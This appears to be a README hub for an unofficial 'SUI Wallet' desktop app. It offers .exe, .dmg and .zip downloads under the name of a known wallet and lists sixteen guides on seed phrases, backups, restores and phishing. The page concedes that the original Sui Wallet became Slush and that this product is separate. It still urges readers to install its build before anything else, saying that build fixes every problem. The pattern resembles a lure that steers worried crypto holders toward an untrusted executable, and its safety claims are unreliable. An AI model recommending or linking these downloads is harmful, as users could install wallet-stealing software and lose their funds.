![SUI Wallet](assets/banner-hub.png)

# SUI Wallet keys, phrases and login

Sixteen guides for what the wallet is, who holds the keys, and how access is restored when the machine is gone.

[![License: Apache-2.0](https://img.shields.io/badge/LICENSE-Apache--2.0-4DA2FF?style=for-the-badge&labelColor=0D1117)](#license) [![Latest release: v0.2.6](https://img.shields.io/badge/RELEASE-v0.2.6-1F6FEB?style=for-the-badge&labelColor=0D1117)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/tag/v0.2.6)

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## What this repository is for

Sixteen guides, one subject: the part of a self-custody wallet that cannot be recovered by anyone else. A desktop wallet that holds its own keys makes the recovery phrase the account itself. There is no server storing a copy, no password reset and no support channel that can restore access, so the phrase, the place it is written and the person who has seen it decide everything that follows.

The pages here take that seriously without turning it into a warning poster. The opening three explain what the product is, how to tell a genuine build from a copy, and what the security model actually promises. The middle of the repository is the phrase: setting it up on first run, backing it up in a way that survives a dead disk, restoring from it, and diagnosing the particular disappointment of a restore that opens an address you do not recognise. The rest covers the awkward cases, which are also the ones people search for: an exposed phrase, a phishing page that looked right, a shared computer, and a browser extension being retired in favour of the desktop app.

Two of these pages exist because the search term itself is ambiguous. More than one product has carried the name SUI Wallet, and the guides say plainly which one they describe.

## Who it is for

- A person holding a phrase on paper who is not certain it will bring the account back, and wants to know before they need it.
- Someone who has just installed the wallet and is about to move value into an account that has no backup yet.
- A reader whose restore opened a different address, or whose phrase may have been seen by someone else.
- Anyone deciding between a browser extension and a desktop application, or between one product called SUI Wallet and another.

## Start here

1. [What is SUI Wallet for desktop?](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/what-is-sui-wallet-desktop.md) - A native desktop wallet for Sui: self-custody, staking, Ledger and zkLogin in one app.
2. [SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) - Twenty-four words generated on your machine, written down once, never typed into a website.
3. [Backing up your SUI Wallet recovery phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/backing-up-your-sui-wallet-recovery-phrase.md) - A backup is only a backup if it still works when the laptop does not.
4. [Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) - Enter the words in order; the wallet derives the address rather than looking it up.

## How to use these guides

1. Start with what the wallet is if the name is the confusion. Two products have used it, and the page that separates them saves a reader from installing the wrong thing and calling it a bug.
2. Do the phrase step before funding the account. Reading the backup page after a balance arrives is the sequence that produces every recovery question in this repository.
3. Test the backup once, deliberately, on a machine you can afford to get wrong. A phrase that has never been restored is a phrase you are trusting, not a phrase you have checked.
4. If a restore opens the wrong address, stop before importing anything else. The wrong-address page explains why a phrase derives one address and how a second account hides behind the same words.
5. If the phrase has been exposed, read the exposure page first and move value second. Order matters more than speed once someone else has the words.

## The guides grouped

| Guide | What it answers |
| --- | --- |
| [What is SUI Wallet for desktop?](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/what-is-sui-wallet-desktop.md) | Define what SUI Wallet is as a desktop application and what it holds that a browser extension does not. |
| [Is SUI Wallet safe to use?](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/is-sui-wallet-safe-to-use.md) | Explain the security model behind a self-custody desktop wallet and the habits that model depends on. |
| [verify you have the official SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/how-to-verify-the-official-sui-wallet.md) | Confirm that a downloaded file came from this project by matching it against the published SHA-256 digest. |
| [SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) | Set up the 24-word recovery phrase during first run and record it in a way that survives a dead disk. |
| [Backing up your SUI Wallet recovery phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/backing-up-your-sui-wallet-recovery-phrase.md) | Store and verify a recovery phrase so that a lost or dead computer does not mean a lost account. |
| [Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) | Restore an account from twenty-four words and check the address that comes back is the funded one. |
| [SUI Wallet shows the wrong address after restore](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-shows-the-wrong-address.md) | Trace why a restored wallet shows an address you do not recognise and how to reach the funded one. |
| [Importing an existing Sui account](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/importing-an-existing-sui-account.md) | Add an existing Sui account to the wallet alongside the one created on first run. |
| [Watching a SUI Wallet address read-only](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/watching-a-sui-wallet-address-read-only.md) | Add an address for observation without holding its keys, and understand what a watch-only entry cannot do. |
| [migrating from a Sui browser wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/migrating-from-a-sui-browser-wallet.md) | Move an account from a Sui browser extension to the desktop application and check the address arrives intact. |
| [what happened to Sui Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/what-happened-to-sui-wallet.md) | Separate the Mysten Labs wallet that became Slush from this desktop application and the search term that joins them. |
| [Avoiding SUI Wallet phishing sites](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/avoiding-sui-wallet-phishing-sites.md) | Recognise a copy of a wallet site and the requests that no genuine wallet ever makes of you. |
| [Someone has my SUI Wallet seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/someone-has-my-sui-wallet-seed-phrase.md) | Act on an exposed recovery phrase: what to move first, what cannot be recovered, and how to start clean. |
| [Creating a new SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/creating-a-new-sui-wallet.md) | Create an account on first run and understand that the phrase, not an email address, is the login. |
| [Importing a SUI Wallet private key](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/importing-a-sui-wallet-private-key.md) | Import a single account from a private key and know when a recovery phrase is the better route. |
| [Deleting SUI Wallet data from a shared PC](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/deleting-sui-wallet-data-from-a-shared-pc.md) | Clear an account and its local files from a computer other people use, in the right order. |

## What each guide changes

| Task | Guide | Outcome |
| --- | --- | --- |
| Decide what you are installing | [What is SUI Wallet for desktop?](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/what-is-sui-wallet-desktop.md) | A clear picture of the desktop product, separated from the other wallet that carried its name. |
| Check a build is genuine | [verify you have the official SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/how-to-verify-the-official-sui-wallet.md) | A downloaded file matched to the digest published beside it, with no other proof required. |
| Create the phrase | [SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) | Twenty-four words generated on the machine, written once, in an order that can be read back. |
| Know the backup works | [Backing up your SUI Wallet recovery phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/backing-up-your-sui-wallet-recovery-phrase.md) | A stored phrase that has restored an account once, rather than one that has only been written down. |
| Recover an account | [Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) | The funded address back in the wallet, with the phrase entered in order and verified afterwards. |
| Limit an exposure | [Someone has my SUI Wallet seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/someone-has-my-sui-wallet-seed-phrase.md) | Value moved to a fresh account, and an honest list of what the old phrase can never get back. |

## Common first questions

### Can this project restore my account if I lose the phrase?

No. Keys are generated and stored on your machine, so there is no copy for anyone to restore. The phrase is the account, which is why the backup pages are the longest ones here.

### Is it safe to type the phrase into a website that asks for it?

No, without exception. No genuine wallet, support channel or recovery service asks for the words, and a page that does is the attack rather than the remedy.

### Why did my restore open a different address?

A phrase derives accounts, and the same words can produce more than one. The wrong-address page walks the discovery step that shows the accounts a phrase holds before anything is imported.

### Is a browser extension or the desktop app safer?

Both hold the same kind of key; they differ in where it lives. A desktop application keeps it in a file on your disk rather than inside a browser profile, and the migration page moves one account across without reusing the words in a new place.

## Before you install

The phrase is 24 words, BIP39, generated on your machine. That is longer than the 12-word flow some other products use, and the two are never the same thing: a 12-word phrase from elsewhere will not restore this wallet.

Before moving value, confirm the build came from the release page and a digest. Most of the questions in this repository arrive after a phrase has been entered into a page that was not the wallet at all.

## About

This repository holds one of three guide sets published from the same account. The others are [install and repair](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting), [keys and login](https://github.com/sui-blockchain-wallet/key-safety-and-login) and [transfers and staking](https://github.com/sui-blockchain-wallet/onchain-transfer-guides), with [the profile repository](https://github.com/sui-blockchain-wallet) as the index.

The wallet is actively maintained. The release linked at the top of this page is the build these guides describe, and the release page is the only distribution channel this project uses.

## License

Apache License 2.0. A copy ships at the root of this repository, and the full text also sits in the application repository's [licence file](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/blob/HEAD/LICENSE).

---

SUI Wallet is a self-custody desktop wallet for Sui. Nothing on this page is investment advice, and no rate, return or unlock figure is a forecast.
